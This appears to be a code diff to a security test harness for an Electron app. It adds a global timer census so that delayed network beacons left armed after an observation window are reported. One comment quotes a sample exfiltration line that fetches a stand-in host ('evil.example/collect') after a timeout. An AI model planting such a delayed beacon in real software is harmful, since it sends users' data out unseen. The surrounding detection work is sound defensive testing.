@@ -55,8 +55,40 @@ const EGRESS_PORT = Number(process.env.EGRESS_PROBE_PORT || 4897);
 // console.log is not (it can drop a buffered tail on exit).
 const RESULT_FILE = process.env.RUNNER_RESULT_FILE
   || path.join(require('os').tmpdir(), `nash-runner-${process.pid}.json`);
+
+// TIMER CENSUS — for EVERY mode, installed before any product file loads.
+//
+// Each mode observes a window and then exits, so anything the app scheduled
+// for after that window is invisible and raising the wait only moves the
+// goalpost. The egress mode grew this census first (SR-10); the reviewer then
+// showed the same trick works one door over, in the preload:
+// `setTimeout(() => fetch('https://evil.example/collect'), 100)` ran with all
+// 430 checks green, because the bridge mode calls out() as soon as the preload
+// module finishes evaluating. A per-mode census would have been the same
+// mistake a third time, so it lives here and out() reports it for all four.
+//
+// A recorded call answers "what did it dial?"; what is still ARMED when the
+// window closes answers "what is it still going to do?", which no wait reaches.
+const scheduledTimers = [];
+const realSetTimeout = globalThis.setTimeout;
+const realSetInterval = globalThis.setInterval;
+globalThis.setTimeout = function (fn, ms, ...rest) {
+  const rec = { ms: Number(ms) || 0, fired: false, kind: 'timeout' };
+  scheduledTimers.push(rec);
+  return realSetTimeout.call(this, (...a) => { rec.fired = true; return fn && fn(...a); }, ms, ...rest);
+};
+// An interval NEVER stops being armed, so it is always a pending timer.
+globalThis.setInterval = function (fn, ms, ...rest) {
+  scheduledTimers.push({ ms: Number(ms) || 0, fired: false, kind: 'interval' });
+  return realSetInterval.call(this, fn, ms, ...rest);
+};
+const pendingTimersNow = () => scheduledTimers.filter((t) => !t.fired).map((t) => t.ms);
+
 const out = (payload) => {
-  require('fs').writeFileSync(RESULT_FILE, JSON.stringify(payload));
+  // Attached here, not by each mode: a mode that forgot would report a clean
+  // run on an app still holding a live timer.
+  const full = { pendingTimers: pendingTimersNow(), ...payload };
+  require('fs').writeFileSync(RESULT_FILE, JSON.stringify(full));
   process.stdout.write(`RUNNER_RESULT_FILE ${RESULT_FILE}\n`);
   process.exit(0);
 };
@@ -103,6 +135,7 @@ if (mode === 'bridge') {
     if (request === 'electron') return { contextBridge, ipcRenderer };
     return originalLoad.call(this, request, parent, isMain);
   };
+  const timersBeforePreload = scheduledTimers.length;
   require(path.resolve(preloadCjs));
   Module._load = originalLoad;
 
@@ -245,7 +278,16 @@ if (mode === 'bridge') {
   const RUNNER_OWN_GLOBALS = new Set(['fetch', 'WebSocket', 'XMLHttpRequest',
     'onExpressListening', 'onDesktopLockFailure', 'expressPort']);
   const syncExposureCount = exposures.length;
-  setTimeout(() => {
+  // What the PRELOAD armed, measured across its own require and nothing else.
+  // out()'s census cannot answer this one: this file has no `return` after the
+  // bridge block, so electron-main.cjs loads afterwards and contributes its own
+  // two timers (800, 3000) to the global list. Snapshotting around the preload
+  // require isolates it — and the preload's correct answer is exactly zero, so
+  // there is no threshold here to tune or outwait.
+  const preloadTimers = scheduledTimers.length - timersBeforePreload;
+  // realSetTimeout for the drain itself, so the runner's own wait is not
+  // counted as a timer the preload armed.
+  realSetTimeout(() => {
     const globalsNow = Reflect.ownKeys(globalThis)
       .filter((k) => !globalsBefore.has(k)).map(String)
       .filter((k) => !RUNNER_OWN_GLOBALS.has(k));
@@ -265,6 +307,12 @@ if (mode === 'bridge') {
       allExposures, globalsAdded: globalsNow, globalLeaks,
       // > 0 means the preload exposed or assigned something AFTER its top level.
       lateExposures: exposures.length - syncExposureCount,
+      // Timers the preload armed, counted across its require and NOTHING else.
+      // Not "everything armed by the time the drain fires": this file has no
+      // `return` after the bridge block, so electron-main.cjs loads in between
+      // and arms its own two (800, 3000). A wider window would report 2 on a
+      // clean tree and force a threshold, which is what lets a beacon hide.
+      preloadTimers,
       drained: true });
   }, 60);
 }
@@ -713,20 +761,6 @@ if (typeof process.getBuiltinModule === 'function') {
 // still going to do?", which no wait can reach. Installed BEFORE the require:
 // patched afterwards it would miss every timer the app arms while loading, and
 // createWindow's update-check timer among them.
-const scheduledTimers = [];
-const realSetTimeout = globalThis.setTimeout;
-const realSetInterval = globalThis.setInterval;
-globalThis.setTimeout = function (fn, ms, ...rest) {
-  const rec = { ms: Number(ms) || 0, fired: false, kind: 'timeout' };
-  scheduledTimers.push(rec);
-  return realSetTimeout.call(this, (...a) => { rec.fired = true; return fn && fn(...a); }, ms, ...rest);
-};
-// An interval NEVER stops being armed, so it is always a pending timer.
-globalThis.setInterval = function (fn, ms, ...rest) {
-  scheduledTimers.push({ ms: Number(ms) || 0, fired: false, kind: 'interval' });
-  return realSetInterval.call(this, fn, ms, ...rest);
-};
-
 require(path.resolve(mainCjs));
 
 // A lifecycle handler that throws under the fake has NOT run to completion, so
@@ -895,8 +929,11 @@ if (mode === 'egress') {
   // The update check is scheduled 3000ms after the first window opens, so wait
   // past it. The test asserts the fetch DID happen: a run that records nothing
   // would otherwise "prove" the app makes no calls by never letting it try.
-  const done = (pendingTimers = []) => {
+  const done = () => {
     assertBooted();
+    // pendingTimers is attached by out() for every mode — see the census at the
+    // top of this file. A fixed window can be outwaited, so what is still ARMED
+    // at report time is a finding too.
     out({
       networkCalls,
       requiredModules: [...new Set(requiredModules)],
@@ -906,14 +943,13 @@ if (mode === 'egress') {
       instrumented,
       windowOptions,
       dialogsShown,
-      pendingTimers,
     });
   };
   fire('browser-window-created', {}, { webContents: mainContents });
 
-  // See the timer census installed before the app loads, above: a fixed window
-  // can be outwaited, so what is still ARMED at report time is a finding too.
-  realSetTimeout(() => done(scheduledTimers.filter((t) => !t.fired).map((t) => t.ms)), 4200);
+  // realSetTimeout, not the patched one: the runner's own wait must not appear
+  // in the census as a timer the app armed.
+  realSetTimeout(done, 4200);
 }
 
 if (mode === 'openexternal') {
